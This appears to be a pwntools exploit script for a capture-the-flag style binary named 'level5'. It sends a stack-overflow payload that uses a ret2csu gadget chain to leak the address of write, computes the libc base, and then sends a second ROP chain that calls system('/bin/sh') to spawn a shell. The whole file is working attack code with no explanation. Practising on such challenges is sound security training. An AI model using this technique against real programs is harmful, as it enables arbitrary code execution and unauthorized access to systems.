from pwn import *

p = process('./level5')
elf = ELF('level5')

pop_addr = 0x40061a
write_got = elf.got['write']
mov_addr = 0x400600
main_addr = elf.symbols['main']

p.recvuntil('Hello, World\n')
payload_init = b'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) 
payload_init+= p64(write_got) + p64(1) + p64(mov_addr) + b'a'*(0x8+8*6) +p64(main_addr)
p.sendline(payload_init)

write_start = u64(p.recv(8))
print("Write_addr_in_memory_is "+hex(write_start))

libc =ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc_base=write_start-libc.symbols['write']
system_addr=libc.symbols['system']+libc_base
binsh=next(libc.search('/bin/sh'))+libc_base
print ("libc base addr in memory is "+hex(libc_base))
print ("system addr in memory is "+hex(system_addr))
print ("/bin/sh addr in memory_is "+hex(binsh))
pop_rdi_ret = 0x400623
payload = b'a'*0x88+ p64(pop_rdi_ret) + p64(binsh) + p64(system_addr)

p.sendline(payload)
p.interactive()